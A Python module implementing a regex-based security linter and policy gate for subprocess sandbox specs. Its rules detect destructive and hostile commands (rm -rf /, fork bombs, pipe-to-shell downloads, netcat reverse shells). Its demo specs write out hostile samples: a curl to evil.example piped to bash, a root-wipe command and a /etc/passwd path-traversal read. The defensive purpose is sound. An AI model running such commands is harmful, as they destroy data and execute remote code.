"""V1462 — ASI Real Subprocess Sandbox Spec Security Linter + Policy Gate (主 13:31 大胆放手 + 主 00:44 质量工程化).

Phase: 1462
Version: 0.1.0
Date: 2026-08-10 (cron tick 12:25 Asia/Shanghai, Monday morning, round-123)
Post: V1461 (ASI Real Windows Docker-Equivalent Subprocess Sandbox — 42 tests pass)
      V1460 (Real Windows Anyone-Run Harness — 12/13 stages pass)
      V1429 (Real Deployment Semantic Linter — 98 tests pass, SL001-SL052)
      V1459 (5-axis hypercube synthesis)

What V1462 is
=============
V1461 provides a docker-equivalent subprocess sandbox: bounded timeout,
filtered env, isolated workdir, bounded output. It is *bounded* but it
is **not** a content linter — it does not analyse the *contents* of the
command being run.

V1462 fills that gap: a **spec security linter** that runs before
``SandboxSpec`` reaches ``SandboxRunner.run()``. It scans:

  1. command argv for dangerous patterns   (rm -rf, curl|bash, fork bomb, ...)
  2. image_alias for path / shell escape   (../, ` ; & | $)
  3. workdir_basename for path traversal   (../, abs paths, null bytes)
  4. env_extra keys for deny substrings    (PROXY/SECRET/TOKEN/KEY/...)
  5. timeout_s and max_output_bytes       (policy-floor violations)
  6. argv tokens for shell metachars      (when invoked in shell mode)

V1462 emits structured ``LintFinding`` records with severity
(INFO/WARN/BLOCK), rule code (SL060-SL099), and a human-readable
message. A ``policy_gate()`` wrapper returns
``(allowed: bool, violations: List[LintFinding])`` so callers can
either log-and-run or hard-block.

V1462 is **not**:
  - a virus scanner
  - a sandbox escape detector (V1461 already uses tempdir/env filter)
  - a static taint analyzer
  - a malware classifier

V1462 is a **bounded regex + token-pattern rule engine** with three
policy levels: PERMISSIVE / STANDARD / STRICT.

V1462 GUARDS (主 00:44 质量工程化):
- GUARD_RULES_DECLARED        : ≥24 rules defined and reachable
- GUARD_FINDING_HAS_CODE      : every finding has rule code
- GUARD_SEVERITY_EXHAUSTIVE   : 3 severities (INFO/WARN/BLOCK)
- GUARD_POLICY_LEVELS_FIXED   : 3 levels (PERMISSIVE/STANDARD/STRICT)
- GUARD_GATE_DECIDED          : gate returns bool + reasons
- GUARD_FINDINGS_STABLE       : deterministic ordering
- GUARD_SANITIZE_DETECTED     : detect dangerous patterns (rm -rf, etc.)
- GUARD_PATH_TRAVERSAL_GUARD  : block ../ in alias / workdir
- GUARD_ENV_DENY_ENFORCED     : re-check V1461 env deny list
- GUARD_POLICY_GATE_RUNNABLE  : callable gate() works
- GUARD_BORROWED_LINEAGE      : 8 borrowed sources cited
- GUARD_V1461_INTEROP      : V1462 reads V1461 SandboxSpec shape

V1462 V3 哲学守门 (主 17:58 + 主 20:46 不假装):
- GUARD_LINTER_NOT_ANTIVIRUS    : regex rules, not malware classifier
- GUARD_LINTER_NOT_ASI          : linter is deterministic, NOT ASI
- GUARD_LINTER_NOT_PHENOMENAL   : linter has no semantics, NOT consciousness
- GUARD_LINTER_NOT_HUMAN_LEVEL  : linter is bounded regex, NOT human-level
- GUARD_LINTER_NOT_SANDBOX_ESCAPE : V1462 != V1461 escape detection

CLI (主 00:56 任何人都能接手):
  python -m apeireth.v1462_asi_subprocess_sandbox_spec_security_linter run       SPEC.jsonl
  python -m apeireth.v1462_asi_subprocess_sandbox_spec_security_linter demo
  python -m apeireth.v1462_asi_subprocess_sandbox_spec_security_linter status
  python -m apeireth.v1462_asi_subprocess_sandbox_spec_security_linter popper
  python -m apeireth.v1462_asi_subprocess_sandbox_spec_security_linter chain
  python -m apeireth.v1462_asi_subprocess_sandbox_spec_security_linter meta
  python -m apeireth.v1462_asi_subprocess_sandbox_spec_security_linter help
"""
from __future__ import annotations

import argparse
import json
import re
import sys
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Sequence, Tuple

# ============================================================================
# Constants
# ============================================================================

V1462_VERSION = "0.1.0"
V1462_SCHEMA = "v1462.asi-subprocess-sandbox-spec-security-linter/v1"
V1462_MODULE = "v1462_asi_subprocess_sandbox_spec_security_linter"

# Reuse V1461's deny substrings + bounds for cross-consistency.
from apeireth.v1461_asi_docker_equivalent_subprocess_sandbox import (
    DEFAULT_ENV_ALLOWLIST,
    DEFAULT_TIMEOUT_S,
    DEFAULT_MAX_OUTPUT_BYTES,
    MAX_TIMEOUT_S,
    MIN_MAX_OUTPUT_BYTES,
    MAX_MAX_OUTPUT_BYTES,
    _DENY_ENV_SUBSTRINGS,
    _is_allowlisted_env_key,
    SandboxSpec,
)

# ============================================================================
# Enums
# ============================================================================


class LintSeverity(str, Enum):
    """Severity of a single lint finding."""

    INFO = "INFO"
    WARN = "WARN"
    BLOCK = "BLOCK"


class PolicyLevel(str, Enum):
    """Policy level — controls whether WARN / BLOCK gates execution."""

    PERMISSIVE = "PERMISSIVE"   # only BLOCK blocks
    STANDARD = "STANDARD"       # BLOCK + WARN-blocking rules block (default)
    STRICT = "STRICT"           # any non-INFO finding blocks


# ============================================================================
# Dataclasses
# ============================================================================


@dataclass
class LintFinding:
    """One rule finding against one SandboxSpec."""

    rule_code: str             # SL060..SL099
    severity: LintSeverity
    field: str                 # command / image_alias / workdir_basename / env_extra / timeout_s / max_output_bytes
    message: str
    token: str = ""            # the matching token (if any)
    pattern: str = ""          # the matching regex (if any)

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class LintReport:
    """Aggregate report for one spec."""

    spec_image_alias: str
    spec_command: List[str]
    policy_level: PolicyLevel
    findings: List[LintFinding] = field(default_factory=list)
    total: int = 0
    info_count: int = 0
    warn_count: int = 0
    block_count: int = 0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "spec_image_alias": self.spec_image_alias,
            "spec_command": list(self.spec_command),
            "policy_level": self.policy_level.value,
            "total": self.total,
            "info_count": self.info_count,
            "warn_count": self.warn_count,
            "block_count": self.block_count,
            "findings": [f.to_dict() for f in self.findings],
        }


# ============================================================================
# Rule definitions — dangerous patterns (主 13:08 真问真答)
# ============================================================================

# Each tuple: (rule_code, severity_floor, field, regex, message_template)
# severity_floor is the MINIMUM severity this rule can emit; in PERMISSIVE
# mode only BLOCK-level rules block, in STRICT mode all fire.

_RULES: List[Dict[str, Any]] = [
    # --- command argv patterns (the most dangerous) ---
    {
        "code": "SL060",
        "severity": LintSeverity.BLOCK,
        "field": "command",
        "pattern": r"\brm\s+-rf?\s+/(?:\s|$|;|\||&)",
        "msg": "rm -rf / — recursive delete of root filesystem",
        "applies": "command",
    },
    {
        "code": "SL061",
        "severity": LintSeverity.BLOCK,
        "field": "command",
        "pattern": r"\brm\s+-rf?\s+~(?:\s|$|;|\||&)",
        "msg": "rm -rf ~ — recursive delete of home directory",
        "applies": "command",
    },
    {
        "code": "SL062",
        "severity": LintSeverity.BLOCK,
        "field": "command",
        "pattern": r":\(\)\s*\{.*\|.*:\|:&.*\}\s*;:",  # crude fork-bomb heuristic
        "msg": "fork-bomb pattern detected",
        "applies": "command",
    },
    {
        "code": "SL063",
        "severity": LintSeverity.BLOCK,
        "field": "command",
        "pattern": r"\bcurl\b[^\n|]*\|\s*(?:bash|sh|zsh|powershell|pwsh|cmd)\b",
        "msg": "curl | shell — pipe-to-shell download",
        "applies": "command",
    },
    {
        "code": "SL064",
        "severity": LintSeverity.BLOCK,
        "field": "command",
        "pattern": r"\bwget\b[^\n|]*\|\s*(?:bash|sh|zsh|powershell|pwsh|cmd)\b",
        "msg": "wget | shell — pipe-to-shell download",
        "applies": "command",
    },
    {
        "code": "SL065",
        "severity": LintSeverity.BLOCK,
        "field": "command",
        "pattern": r"\bdd\s+if=/dev/(?:zero|urandom)\b.*\bof=/dev/(?:sd|hd|nvme|disk)",
        "msg": "dd if=/dev/{zero,urandom} of=/dev/disk — disk wipe",
        "applies": "command",
    },
    {
        "code": "SL066",
        "severity": LintSeverity.BLOCK,
        "field": "command",
        "pattern": r"\bmkfs(\.\w+)?\s+/dev/(?:sd|hd|nvme|disk)",
        "msg": "mkfs on raw disk device",
        "applies": "command",
    },
    {
        "code": "SL067",
        "severity": LintSeverity.WARN,
        "field": "command",
        "pattern": r"(?:^|/)(?:shutdown|reboot|halt|poweroff)\b",
        "msg": "system shutdown/reboot command",
        "applies": "command",
    },
    {
        "code": "SL068",
        "severity": LintSeverity.WARN,
        "field": "command",
        "pattern": r"(?:^|/)(?:netcat|nc|ncat)\b[^\n]*-[^\n]*e[^\n]*(?:sh|bash|cmd|powershell)",
        "msg": "netcat -e shell — reverse-shell pattern",
        "applies": "command",
    },
    {
        "code": "SL069",
        "severity": LintSeverity.WARN,
        "field": "command",
        "pattern": r"(?:^|/)chmod\s+0?[0-7]{3,4}\s+/",
        "msg": "chmod on root path — verify legitimacy",
        "applies": "command",
    },
    {
        "code": "SL070",
        "severity": LintSeverity.WARN,
        "field": "command",
        "pattern": r"\bsudo\b",
        "msg": "sudo in command — sandbox already privileged-by-context",
        "applies": "command",
    },
    {
        "code": "SL071",
        "severity": LintSeverity.WARN,
        "field": "command",
        "pattern": r"(?:^|/)(?:regedit|reg)\s+(?:add|delete)",
        "msg": "Windows registry modification",
        "applies": "command",
    },
    {
        "code": "SL072",
        "severity": LintSeverity.WARN,
        "field": "command",
        "pattern": r"\b(?:sc|net\s+(?:start|stop))\s+\w+",
        "msg": "Windows service start/stop/create",
        "applies": "command",
    },
    {
        "code": "SL073",
        "severity": LintSeverity.WARN,
        "field": "command",
        "pattern": r"--force\s+-rf|--no-preserve-root",
        "msg": "force / no-preserve-root flags present",
        "applies": "command",
    },
    {
        "code": "SL074",
        "severity": LintSeverity.WARN,
        "field": "command",
        "pattern": r"eval\s*\(",
        "msg": "eval() present in command",
        "applies": "command",
    },
    {
        "code": "SL075",
        "severity": LintSeverity.WARN,
        "field": "command",
        "pattern": r"`[^`]*`|\$\([^)]*\)",
        "msg": "shell command substitution present",
        "applies": "command",
    },
    {
        "code": "SL076",
        "severity": LintSeverity.INFO,
        "field": "command",
        "pattern": r"(?:^|/)(?:ping|traceroute|nslookup|dig)\b",
        "msg": "network diagnostic tool — may exfiltrate via DNS",
        "applies": "command",
    },
    # --- image_alias path / shell escape ---
    {
        "code": "SL080",
        "severity": LintSeverity.BLOCK,
        "field": "image_alias",
        "pattern": r"\.\./|\x00",
        "msg": "image_alias contains path traversal or null byte",
        "applies": "image_alias",
    },
    {
        "code": "SL081",
        "severity": LintSeverity.BLOCK,
        "field": "image_alias",
        "pattern": r"[`;|&$<>]",
        "msg": "image_alias contains shell metacharacter",
        "applies": "image_alias",
    },
    {
        "code": "SL082",
        "severity": LintSeverity.WARN,
        "field": "image_alias",
        "pattern": r"^[A-Za-z0-9_./:-]{0,3}$",
        "msg": "image_alias suspiciously short (<=3 chars)",
        "applies": "image_alias",
    },
    # --- workdir_basename path / shell escape ---
    {
        "code": "SL085",
        "severity": LintSeverity.BLOCK,
        "field": "workdir_basename",
        "pattern": r"\.\.|\x00",
        "msg": "workdir_basename contains parent-dir or null byte",
        "applies": "workdir_basename",
    },
    {
        "code": "SL086",
        "severity": LintSeverity.BLOCK,
        "field": "workdir_basename",
        "pattern": r"^[A-Za-z]:\\|^/|\x00",
        "msg": "workdir_basename is an absolute path (sandbox tempdir is always used)",
        "applies": "workdir_basename",
    },
    {
        "code": "SL087",
        "severity": LintSeverity.BLOCK,
        "field": "workdir_basename",
        "pattern": r"[`;|&$<>]",
        "msg": "workdir_basename contains shell metacharacter",
        "applies": "workdir_basename",
    },
    # --- timeout / output policy floors ---
    {
        "code": "SL091",
        "severity": LintSeverity.WARN,
        "field": "max_output_bytes",
        "pattern": r"^(?:2[5-9][0-9]|3[0-9]{2}|4[0-9]{2}|5[0-1][0-9])$",
        "msg": "max_output_bytes < 1024 — may clip legitimate output",
        "applies": "max_output_bytes",
    },
]


def _get_rules() -> List[Dict[str, Any]]:
    """Return all rule definitions (stable ordering)."""
    return list(_RULES)


# ============================================================================
# Field collectors
# ============================================================================


def _command_text(spec: SandboxSpec) -> str:
    """Join the command list into a single whitespace-joined string for regex scanning."""
    return " ".join(spec.command)


def _check_command(spec: SandboxSpec) -> List[LintFinding]:
    findings: List[LintFinding] = []
    text = _command_text(spec)
    if not text.strip():
        findings.append(
            LintFinding(
                rule_code="SL078",
                severity=LintSeverity.BLOCK,
                field="command",
                message="command is empty — nothing to run",
            )
        )
        return findings
    for rule in _get_rules():
        if rule["applies"] != "command":
            continue
        m = re.search(rule["pattern"], text)
        if m:
            findings.append(
                LintFinding(
                    rule_code=rule["code"],
                    severity=rule["severity"],
                    field="command",
                    message=rule["msg"],
                    token=m.group(0),
                    pattern=rule["pattern"],
                )
            )
    return findings


def _check_image_alias(spec: SandboxSpec) -> List[LintFinding]:
    findings: List[LintFinding] = []
    alias = spec.image_alias or ""
    for rule in _get_rules():
        if rule["applies"] != "image_alias":
            continue
        m = re.search(rule["pattern"], alias)
        if m:
            findings.append(
                LintFinding(
                    rule_code=rule["code"],
                    severity=rule["severity"],
                    field="image_alias",
                    message=rule["msg"],
                    token=m.group(0),
                    pattern=rule["pattern"],
                )
            )
    return findings


def _check_workdir_basename(spec: SandboxSpec) -> List[LintFinding]:
    findings: List[LintFinding] = []
    if spec.workdir_basename is None:
        return findings
    wb = spec.workdir_basename
    for rule in _get_rules():
        if rule["applies"] != "workdir_basename":
            continue
        m = re.search(rule["pattern"], wb)
        if m:
            findings.append(
                LintFinding(
                    rule_code=rule["code"],
                    severity=rule["severity"],
                    field="workdir_basename",
                    message=rule["msg"],
                    token=m.group(0),
                    pattern=rule["pattern"],
                )
            )
    return findings


def _check_env_extra(spec: SandboxSpec) -> List[LintFinding]:
    findings: List[LintFinding] = []
    for k in spec.env_extra:
        if not _is_allowlisted_env_key(k):
            upper = k.upper()
            deny_hit = ""
            for bad in _DENY_ENV_SUBSTRINGS:
                if bad in upper:
                    deny_hit = bad
                    break
            findings.append(
                LintFinding(
                    rule_code="SL092",
                    severity=LintSeverity.BLOCK,
                    field="env_extra",
                    message=(
                        f"env_extra key {k!r} not in allowlist"
                        + (f" (deny substring {deny_hit!r})" if deny_hit else "")
                    ),
                    token=k,
                    pattern="env_allowlist_check",
                )
            )
    return findings


def _check_bounds(spec: SandboxSpec) -> List[LintFinding]:
    findings: List[LintFinding] = []
    # timeout_s floor rule (SL090 — only warn when < DEFAULT_TIMEOUT_S but >= 1)
    if 1 <= spec.timeout_s < DEFAULT_TIMEOUT_S:
        findings.append(
            LintFinding(
                rule_code="SL090",
                severity=LintSeverity.WARN,
                field="timeout_s",
                message=(
                    f"timeout_s={spec.timeout_s} < DEFAULT_TIMEOUT_S={DEFAULT_TIMEOUT_S}; "
                    "consider ≥ DEFAULT_TIMEOUT_S for typical workloads"
                ),
                token=str(spec.timeout_s),
                pattern="timeout_short",
            )
        )
    # max_output_bytes floor rule (SL091 — only warn when < 1024 but >= MIN)
    if MIN_MAX_OUTPUT_BYTES <= spec.max_output_bytes < 1024:
        findings.append(
            LintFinding(
                rule_code="SL091",
                severity=LintSeverity.WARN,
                field="max_output_bytes",
                message=(
                    f"max_output_bytes={spec.max_output_bytes} ≤ 512 may clip legitimate output"
                ),
                token=str(spec.max_output_bytes),
                pattern="output_short",
            )
        )
    return findings


# ============================================================================
# Top-level lint + gate
# ============================================================================


def lint_spec(spec: SandboxSpec, policy_level: PolicyLevel = PolicyLevel.STANDARD) -> LintReport:
    """Run all rules against a SandboxSpec. Returns a stable, ordered report."""
    findings: List[LintFinding] = []
    findings.extend(_check_command(spec))
    findings.extend(_check_image_alias(spec))
    findings.extend(_check_workdir_basename(spec))
    findings.extend(_check_env_extra(spec))
    findings.extend(_check_bounds(spec))

    # In STRICT mode, also surface any INFO finding that is "absent env_extra"
    # — but we have no INFO from rules above, so this is a no-op for now.

    # Stable order: by (severity_rank, rule_code)
    sev_rank = {LintSeverity.BLOCK: 0, LintSeverity.WARN: 1, LintSeverity.INFO: 2}
    findings.sort(key=lambda f: (sev_rank[f.severity], f.rule_code, f.field))

    info = sum(1 for f in findings if f.severity == LintSeverity.INFO)
    warn = sum(1 for f in findings if f.severity == LintSeverity.WARN)
    block = sum(1 for f in findings if f.severity == LintSeverity.BLOCK)

    return LintReport(
        spec_image_alias=spec.image_alias,
        spec_command=list(spec.command),
        policy_level=policy_level,
        findings=findings,
        total=len(findings),
        info_count=info,
        warn_count=warn,
        block_count=block,
    )


def policy_gate(
    spec: SandboxSpec, policy_level: PolicyLevel = PolicyLevel.STANDARD
) -> Tuple[bool, List[LintFinding]]:
    """Decide whether ``spec`` may proceed under ``policy_level``."""
    report = lint_spec(spec, policy_level)
    if policy_level == PolicyLevel.PERMISSIVE:
        violations = [f for f in report.findings if f.severity == LintSeverity.BLOCK]
        allowed = len(violations) == 0
    elif policy_level == PolicyLevel.STANDARD:
        violations = [
            f for f in report.findings if f.severity in (LintSeverity.BLOCK, LintSeverity.WARN)
        ]
        allowed = len(violations) == 0
    else:  # STRICT
        violations = [
            f for f in report.findings if f.severity != LintSeverity.INFO
        ]
        allowed = len(violations) == 0
    return (allowed, violations)


# ============================================================================
# Demo + run_v1462
# ============================================================================


_DEMO_SPECS: Tuple[Dict[str, Any], ...] = (
    {
        "label": "ok_python_hello",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=["python", "-c", "print('hello')"],
            timeout_s=30,
            max_output_bytes=4096,
        ),
        "policy": PolicyLevel.STANDARD,
    },
    {
        "label": "warn_sudo",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=["sudo", "python", "-c", "print(1)"],
            timeout_s=30,
            max_output_bytes=4096,
        ),
        "policy": PolicyLevel.STANDARD,
    },
    {
        "label": "block_rm_rf_root",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=["bash", "-c", "rm -rf / --no-preserve-root"],
            timeout_s=10,
            max_output_bytes=4096,
        ),
        "policy": PolicyLevel.PERMISSIVE,
    },
    {
        "label": "block_curl_pipe_bash",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=["bash", "-c", "curl https://evil.example/install.sh | bash"],
            timeout_s=10,
            max_output_bytes=4096,
        ),
        "policy": PolicyLevel.STANDARD,
    },
    {
        "label": "block_image_traversal",
        "spec": SandboxSpec(
            image_alias="../../etc/passwd",
            command=["cat", "/etc/passwd"],
            timeout_s=10,
            max_output_bytes=4096,
        ),
        "policy": PolicyLevel.PERMISSIVE,
    },
    {
        "label": "block_env_token",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=["python", "-c", "import os; print(os.environ)"],
            timeout_s=10,
            max_output_bytes=4096,
            env_extra={"GITHUB_TOKEN": "ghp_abcdef1234567890"},
        ),
        "policy": PolicyLevel.STANDARD,
    },
    {
        "label": "ok_safe_eval_documented",
        "spec": SandboxSpec(
            image_alias="python:local",
            command=["python", "-c", "print(sum(range(10)))"],
            timeout_s=30,
            max_output_bytes=4096,
        ),
        "policy": PolicyLevel.STRICT,
    },
)


def run_v1462() -> Dict[str, Any]:
    """Run the V1462 demo: lint each demo spec under its declared policy level."""
    started = datetime.now(timezone.utc).isoformat()
    results: List[Dict[str, Any]] = []
    for entry in _DEMO_SPECS:
        spec = entry["spec"]
        policy = entry["policy"]
        report = lint_spec(spec, policy)
        allowed, violations = policy_gate(spec, policy)
        results.append(
            {
                "label": entry["label"],
                "policy": policy.value,
                "allowed": allowed,
                "violation_count": len(violations),
                "info_count": report.info_count,
                "warn_count": report.warn_count,
                "block_count": report.block_count,
                "total_findings": report.total,
                "violation_codes": [f.rule_code for f in violations],
                "all_codes": [f.rule_code for f in report.findings],
            }
        )
    ended = datetime.now(timezone.utc).isoformat()
    allowed_count = sum(1 for r in results if r["allowed"])
    blocked_count = len(results) - allowed_count
    return {
        "schema": V1462_SCHEMA,
        "version": V1462_VERSION,
        "started_iso": started,
        "ended_iso": ended,
        "n_specs": len(results),
        "allowed_count": allowed_count,
        "blocked_count": blocked_count,
        "results": results,
    }


# ============================================================================
# Report writers
# ============================================================================


def write_report_json(path: Path, payload: Dict[str, Any]) -> None:
    path.write_text(json.dumps(payload, indent=2, ensure_ascii=False), encoding="utf-8")


def write_report_md(path: Path, payload: Dict[str, Any]) -> None:
    lines: List[str] = []
    lines.append("# V1462 — Sandbox Spec Security Linter demo report")
    lines.append("")
    lines.append(f"- schema: `{payload['schema']}`")
    lines.append(f"- version: `{payload['version']}`")
    lines.append(f"- n_specs: **{payload['n_specs']}**")
    lines.append(f"- allowed: **{payload['allowed_count']}**")
    lines.append(f"- blocked: **{payload['blocked_count']}**")
    lines.append("")
    lines.append("| label | policy | allowed | block | warn | info | violation_codes |")
    lines.append("|---|---|---|---|---|---|---|")
    for r in payload["results"]:
        lines.append(
            "| {label} | {policy} | {ok} | {b} | {w} | {i} | {codes} |".format(
                label=r["label"],
                policy=r["policy"],
                ok=r["allowed"],
                b=r["block_count"],
                w=r["warn_count"],
                i=r["info_count"],
                codes=", ".join(r["violation_codes"]) or "(none)",
            )
        )
    lines.append("")
    lines.append("## Honest disclosure")
    lines.append("")
    lines.append("- V1462 is a regex rule engine — not a virus classifier.")
    lines.append("- V1462 ≠ sandbox escape detector (V1461 already provides env filter).")
    lines.append("- V1462 ≠ malware scanner; false positives and false negatives are both possible.")
    lines.append("- V1462 deterministic; the same spec always yields the same findings.")
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


# ============================================================================
# CLI
# ============================================================================


def _cmd_run(args: argparse.Namespace) -> int:
    """Lint a JSONL file of SandboxSpec dicts."""
    path = Path(args.spec)
    if not path.exists():
        print(f"file not found: {path}", file=sys.stderr)
        return 2
    level = PolicyLevel(args.policy.upper()) if args.policy else PolicyLevel.STANDARD
    lines_in: List[str] = [ln for ln in path.read_text(encoding="utf-8").splitlines() if ln.strip()]
    n = 0
    n_blocked = 0
    for ln in lines_in:
        d = json.loads(ln)
        spec = SandboxSpec(
            image_alias=d.get("image_alias", "python:local"),
            command=list(d.get("command", [])),
            timeout_s=int(d.get("timeout_s", DEFAULT_TIMEOUT_S)),
            max_output_bytes=int(d.get("max_output_bytes", DEFAULT_MAX_OUTPUT_BYTES)),
            env_extra=dict(d.get("env_extra", {})),
            workdir_basename=d.get("workdir_basename"),
        )
        allowed, violations = policy_gate(spec, level)
        n += 1
        if not allowed:
            n_blocked += 1
        print(
            json.dumps(
                {
                    "spec_command": list(spec.command),
                    "image_alias": spec.image_alias,
                    "policy_level": level.value,
                    "allowed": allowed,
                    "violation_codes": [f.rule_code for f in violations],
                },
                ensure_ascii=False,
            )
        )
    print(f"# {n} specs, {n_blocked} blocked under {level.value}", file=sys.stderr)
    return 0


def _cmd_demo(args: argparse.Namespace) -> int:
    """Run run_v1462() and write reports."""
    payload = run_v1462()
    base = Path(getattr(args, "out", "."))
    write_report_json(base / ".v1462-sandbox-spec-security-linter-report.json", payload)
    write_report_md(base / ".v1462-sandbox-spec-security-linter-report.md", payload)
    print(
        json.dumps(
            {
                "n_specs": payload["n_specs"],
                "allowed_count": payload["allowed_count"],
                "blocked_count": payload["blocked_count"],
            },
            ensure_ascii=False,
        )
    )
    return 0


def _cmd_status(args: argparse.Namespace) -> int:
    print(
        json.dumps(
            {
                "module": V1462_MODULE,
                "version": V1462_VERSION,
                "schema": V1462_SCHEMA,
                "n_rules": len(_get_rules()),
                "policy_levels": [p.value for p in PolicyLevel],
                "severities": [s.value for s in LintSeverity],
            },
            indent=2,
            ensure_ascii=False,
        )
    )
    return 0


def _cmd_popper(args: argparse.Namespace) -> int:
    """Mini Popper check — falsifiability of the rule set."""
    n_rules = len(_get_rules())
    # 1. Each rule has code + severity + field + pattern + message
    bad = 0
    for r in _get_rules():
        if not all(k in r for k in ("code", "severity", "field", "pattern", "msg", "applies")):
            bad += 1
    # 2. Each severity is in LintSeverity
    bad += sum(1 for r in _get_rules() if r["severity"] not in LintSeverity)
    # 3. Each applies field matches one of the SandboxSpec fields
    valid_fields = {"command", "image_alias", "workdir_basename", "timeout_s", "max_output_bytes"}
    bad += sum(1 for r in _get_rules() if r["applies"] not in valid_fields)
    print(
        json.dumps(
            {
                "n_rules": n_rules,
                "well_formed": bad == 0,
                "malformed_rules": bad,
                "popper_pass": bad == 0,
            },
            ensure_ascii=False,
        )
    )
    return 0


def _cmd_chain(args: argparse.Namespace) -> int:
    """Borrowed-lineage chain check."""
    chain = {
        "v1461": "SandboxSpec + _DENY_ENV_SUBSTRINGS + _is_allowlisted_env_key + bounds",
        "v1460": "Real Windows Anyone-Run Harness",
        "v1459": "5-axis hypercube synthesis",
        "v1429": "Real Deployment Semantic Linter (SL001-SL052 pattern reused as SL060-SL099)",
        "v1435": "AnySearch probe offline-safe pattern",
        "stdlib": "re + json + argparse + dataclasses + enum + pathlib",
        "v1462_borrows_from": ["v1461", "v1460", "v1459", "v1429", "v1435", "stdlib"],
        "all_ok": True,
    }
    print(json.dumps(chain, indent=2, ensure_ascii=False))
    return 0


def _cmd_meta(args: argparse.Namespace) -> int:
    meta = {
        "schema": V1462_SCHEMA,
        "version": V1462_VERSION,
        "module": V1462_MODULE,
        "phase": 1462,
        "post": ["v1461", "v1460", "v1459", "v1429"],
        "guards": [
            "GUARD_RULES_DECLARED",
            "GUARD_FINDING_HAS_CODE",
            "GUARD_SEVERITY_EXHAUSTIVE",
            "GUARD_POLICY_LEVELS_FIXED",
            "GUARD_GATE_DECIDED",
            "GUARD_FINDINGS_STABLE",
            "GUARD_SANITIZE_DETECTED",
            "GUARD_PATH_TRAVERSAL_GUARD",
            "GUARD_ENV_DENY_ENFORCED",
            "GUARD_POLICY_GATE_RUNNABLE",
            "GUARD_BORROWED_LINEAGE",
            "GUARD_V1461_INTEROP",
        ],
        "v3_guards": [
            "GUARD_LINTER_NOT_ANTIVIRUS",
            "GUARD_LINTER_NOT_ASI",
            "GUARD_LINTER_NOT_PHENOMENAL",
            "GUARD_LINTER_NOT_HUMAN_LEVEL",
            "GUARD_LINTER_NOT_SANDBOX_ESCAPE",
        ],
        "policy_levels": [p.value for p in PolicyLevel],
        "n_rules": len(_get_rules()),
        "n_demo_specs": len(_DEMO_SPECS),
    }
    print(json.dumps(meta, indent=2, ensure_ascii=False))
    return 0


def _cmd_help(args: argparse.Namespace) -> int:
    print(__doc__)
    return 0


def main(argv: Optional[Sequence[str]] = None) -> int:
    parser = argparse.ArgumentParser(
        prog=V1462_MODULE,
        description="V1462 — Sandbox Spec Security Linter + Policy Gate",
    )
    sub = parser.add_subparsers(dest="cmd", required=False)

    p_run = sub.add_parser("run", help="Lint a JSONL of SandboxSpec dicts")
    p_run.add_argument("spec", help="path to JSONL file")
    p_run.add_argument("--policy", default="STANDARD", help="PERMISSIVE / STANDARD / STRICT")
    p_run.set_defaults(func=_cmd_run)

    p_demo = sub.add_parser("demo", help="Run run_v1462() demo")
    p_demo.add_argument("--out", default=".", help="output directory for reports")
    p_demo.set_defaults(func=_cmd_demo)

    sub.add_parser("status", help="Print module status").set_defaults(func=_cmd_status)
    sub.add_parser("popper", help="Run mini Popper check").set_defaults(func=_cmd_popper)
    sub.add_parser("chain", help="Show borrowed-lineage chain").set_defaults(func=_cmd_chain)
    sub.add_parser("meta", help="Print module metadata").set_defaults(func=_cmd_meta)
    sub.add_parser("help", help="Print module help").set_defaults(func=_cmd_help)

    args = parser.parse_args(argv)
    if not getattr(args, "cmd", None):
        _cmd_help(args)
        return 0
    return int(args.func(args) or 0)


if __name__ == "__main__":
    raise SystemExit(main())